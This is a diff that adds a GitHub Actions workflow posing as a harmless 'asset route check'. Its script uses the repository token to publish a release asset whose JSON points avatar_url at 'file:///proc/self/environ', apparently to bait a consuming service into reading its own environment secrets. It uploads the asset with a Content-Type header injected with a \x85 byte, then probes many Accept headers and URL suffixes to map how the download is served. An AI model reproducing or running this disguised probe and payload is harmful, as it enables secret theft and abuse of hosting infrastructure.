@@ -1,0 +1,48 @@
+name: Asset route check
+
+on:
+  push:
+    branches:
+      - media-check-1025
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  actions: read
+
+jobs:
+  inspect:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exercise asset routes
+        uses: actions/github-script@v8
+        env:
+          ACCESS_TOKEN: ${{ github.token }}
+        with:
+          script: |
+            const https=require('https');
+            const owner=context.repo.owner, repo=context.repo.repo;
+            const ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Whale/5.39.412.57 Safari/537.36';
+            function req(url,{method='GET',headers={},body=null}={}){return new Promise((resolve,reject)=>{const q=https.request(url,{method,headers:{'User-Agent':ua,...headers}},r=>{const a=[];r.on('data',c=>a.push(c));r.on('end',()=>resolve({status:r.statusCode,headers:r.headers,body:Buffer.concat(a)}));});q.on('error',reject);if(body)q.write(body);q.end();});}
+            const auth={'Authorization':'Bearer '+process.env.ACCESS_TOKEN,'Accept':'application/vnd.github+json','X-GitHub-Api-Version':'2022-11-28'};
+            const tag='media-route-test';
+            let rel=await req('https://api.github.com/repos/'+owner+'/'+repo+'/releases/tags/'+tag,{headers:auth});
+            if(rel.status===404){rel=await req('https://api.github.com/repos/'+owner+'/'+repo+'/releases',{method:'POST',headers:{...auth,'Content-Type':'application/json'},body:Buffer.from(JSON.stringify({tag_name:tag,target_commitish:context.ref.replace('refs/heads/',''),name:'Media route test',draft:false,prerelease:true}))});}
+            console.log('release status='+rel.status);
+            const release=JSON.parse(rel.body.toString());
+            const body=Buffer.from('{"full_name":"reinusKR/script-server","owner":{"login":"x","avatar_url":"file:///proc/self/environ"},"stargazers_count":0}');
+            const list=await req('https://api.github.com/repos/'+owner+'/'+repo+'/releases/'+release.id+'/assets',{headers:auth});
+            if(list.status===200){for(const a of JSON.parse(list.body.toString()))if(a.name==='route-payload.json')await req('https://api.github.com/repos/'+owner+'/'+repo+'/releases/assets/'+a.id,{method:'DELETE',headers:auth});}
+            const up=await req('https://uploads.github.com/repos/'+owner+'/'+repo+'/releases/'+release.id+'/assets?name=route-payload.json',{method:'POST',headers:{...auth,'Content-Type':'application/json\x85','Content-Length':String(body.length)},body});
+            console.log('upload status='+up.status+' ct='+Buffer.from(up.headers['content-type']||'','latin1').toString('hex')+' body='+up.body.toString().slice(0,1000));
+            if(up.status!==201)return;
+            const asset=JSON.parse(up.body.toString());
+            const accepts=['application/vnd.github+json','application/octet-stream','application/vnd.github.raw+json','application/vnd.github.v3.raw','*/*'];
+            const suffixes=['','?download=1','?raw=1','.json','.raw','/download'];
+            for(const suffix of suffixes)for(const accept of accepts){
+              const first=await req('https://api.github.com/repos/'+owner+'/'+repo+'/releases/assets/'+asset.id+suffix,{headers:{...auth,Accept:accept}});
+              let msg='s='+JSON.stringify(suffix)+' a='+accept+' st='+first.status+' ct='+Buffer.from(first.headers['content-type']||'','latin1').toString('hex')+' n='+first.body.length;
+              if(first.headers.location){let u;try{u=new URL(first.headers.location)}catch{};msg+=' loc='+(u?u.host+u.pathname+'?'+[...u.searchParams.keys()].sort().join(',')+' rscthex='+Buffer.from(u.searchParams.get('rsct')||'','latin1').toString('hex'):'bad');const fin=await req(first.headers.location);msg+=' fin='+fin.status+' fct='+Buffer.from(fin.headers['content-type']||'','latin1').toString('hex')+' fn='+fin.body.length+' same='+fin.body.equals(body);}
+              console.log(msg);
+            }
+            console.log('asset_id='+asset.id+' release_id='+release.id);
